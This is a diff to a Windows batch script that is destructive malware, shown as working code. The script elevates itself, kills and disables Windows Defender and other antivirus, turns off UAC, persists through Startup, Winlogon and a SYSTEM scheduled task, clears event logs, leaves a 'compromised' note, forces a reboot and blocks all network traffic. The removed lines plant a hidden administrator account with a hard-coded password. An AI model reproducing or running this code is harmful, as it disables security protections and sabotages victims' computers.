@@ -1,20 +1,41 @@
 @echo off
 setlocal enabledelayedexpansion
 
-net user shadowAdmin DghYUhy489Gdg563F /add >nul 2>&1
-net localgroup administrators shadowAdmin /add >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v shadowAdmin /t REG_DWORD /d 0 /f >nul 2>&1
-echo Set UAC = CreateObject("Shell.Application") > "%TEMP%\bypass.vbs"
-echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%TEMP%\bypass.vbs"
-wscript.exe "%TEMP%\bypass.vbs" >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "%~f0" /t REG_SZ /d "RUNASADMIN" /f >nul 2>&1
-if not '%1'=='admin' (
-    powershell -Command "Start-Process '%~f0' -ArgumentList 'admin' -Verb RunAs" >nul 2>&1
+if "%1"=="admin" goto :admin
+powershell -Command "Start-Process '%~f0' -ArgumentList 'admin' -Verb RunAs"
+exit /b
+:admin
+
+if not "%1"=="bios_level" (
+    powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
+        $code = @'
+        [DllImport(\"kernel32.dll\")]public static extern IntPtr GetCurrentProcess();
+        [DllImport(\"advapi32.dll\")]public static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);
+        [DllImport(\"advapi32.dll\")]public static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref TOKEN_PRIVILEGES p,uint l,IntPtr p,IntPtr r);
+        public struct TOKEN_PRIVILEGES{public uint Count;public long Luid;public uint Attr;}
+        public const uint SE_PRIVILEGE_ENABLED=0x2;
+        public const string SE_SHUTDOWN_NAME=\"SeShutdownPrivilege\";
+        public const uint TOKEN_ADJUST_PRIVILEGES=0x20;
+        public const uint TOKEN_QUERY=0x8;
+'@
+        Add-Type -MemberDefinition $code -Name Win32 -Namespace System
+        $proc = [System.Diagnostics.Process]::GetCurrentProcess()
+        $hdl = $proc.Handle
+        Invoke-Expression 'cmd /c start /trustlevel:0x40000 %~s0 bios_level'
+    " >nul 2>&1
+    exit /b
 )
 
-set /a "pid=0" && for /f "tokens=2" %%i in ('tasklist ^| findstr /i "ekrn msmpeng"') do (set pid=%%i && if !pid! NEQ 0 (taskkill /f /pid !pid! >nul && call :PATCH_DRIVER !pid!))
-taskkill /f /im MsMpEng.exe
+taskkill /f /im MsMpEng.exe /im AntimalwareServiceExecutable.exe /im SecurityHealthService.exe >nul 2>&1
+sc config WinDefend start= disabled >nul
+sc stop WinDefend >nul
 attrib +s +h +i +l +x +a "%0" >nul
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f >nul 2>&1
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
+set /a "pid=0" && for /f "tokens=2" %%i in ('tasklist ^| findstr /i "ekrn msmpeng"') do (set pid=%%i && if !pid! NEQ 0 (taskkill /f /pid !pid! >nul && call :PATCH_DRIVER !pid!))
 wmic process where name="cmd.exe" call setpriority "idle" >nul 2>&1
 copy %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 copy %0 "C:\Windows\Tasks\bat.bat" >nul
@@ -25,6 +46,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "legalnoticecaption" /d "bat.bat" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "legalnoticetext" /d "xDDD" /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
+schtasks /create /tn "SystemRestoreCheck" /tr "%0" /sc minute /mo 5 /ru SYSTEM /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul
 wmic /namespace:\\root\securitycenter2 path antivirusproduct delete >nul 2>&1
 reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f
@@ -139,3 +161,12 @@ wevtutil cl Security
 wevtutil cl Application
 echo Your system has been compromised. > %userprofile%\Desktop\READ_ME.txt
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v Destroy /t REG_SZ /d "shutdown /r /t 60 /c ""Critical Error""" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
+netsh interface set interface "Ethernet" admin=disable >nul 2>&1
+netsh interface set interface "Wi-Fi" admin=disable >nul 2>&1
+ipconfig /release all >nul 2>&1
+netsh advfirewall set allprofiles state on >nul 2>&1
+netsh advfirewall firewall add rule name="BlockAllTraffic" dir=in action=block protocol=ANY remoteip=any >nul 2>&1
+netsh advfirewall firewall add rule name="BlockAllTrafficOut" dir=out action=block protocol=ANY remoteip=any >nul 2>&1
+powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTMODE 0 >nul 2>&1
+powercfg -setactive SCHEME_CURRENT >nul 2>&1
